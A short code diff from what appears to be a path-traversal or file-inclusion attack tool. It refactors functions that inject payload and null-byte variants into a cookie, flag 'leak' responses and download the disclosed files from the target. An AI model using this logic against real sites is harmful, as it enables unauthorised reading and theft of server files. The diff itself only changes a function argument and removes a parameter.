@@ -81,7 +81,7 @@ def determine_payloads_cookie(url, cookie, selected ,verbose, depth, paylist, fi
             found = False
             for (r, p, nb) in requestlist:
                 if str(r.status_code).startswith("2") or r.status_code == 302 or r.status_code == 403:
-                    if filecheck(r.content, con2, p):
+                    if filecheck(r, con2, p):
                         payloads.append(i)
                         if nb != "":
                             nullbytes.append(nb)
@@ -93,7 +93,7 @@ def determine_payloads_cookie(url, cookie, selected ,verbose, depth, paylist, fi
     
     return (payloads, nullbytes)
 
-def cookie_attack(url, cookie, selected, files, dirs, depth, verbose, dl, summary, selected_payloads, selected_nullbytes):
+def cookie_attack(url, cookie, selected, files, dirs, depth, verbose, dl, selected_payloads, selected_nullbytes):
     s = session()
     found=[]
     urls = []
@@ -126,7 +126,7 @@ def cookie_attack(url, cookie, selected, files, dirs, depth, verbose, dl, summar
                         #s.cookies.clear()
                         s.cookies.set(selected, val)
                         if str(r.status_code).startswith("2") or r.status_code == 302:
-                            if filecheck(r.content, con2, val):
+                            if filecheck(r, con2, val):
                                 print(color.RD+"[INFO]"+color.O+" leak"+color.END+"       "+color.RD+"statvs-code"+color.END+"="+color.O+str(r.status_code)+color.END+" "+color.R+"cookie"+color.END+"="+val)
                                 if dl and dir+file not in found:
                                     download(r.url,dir+file,cookie=s.cookies)
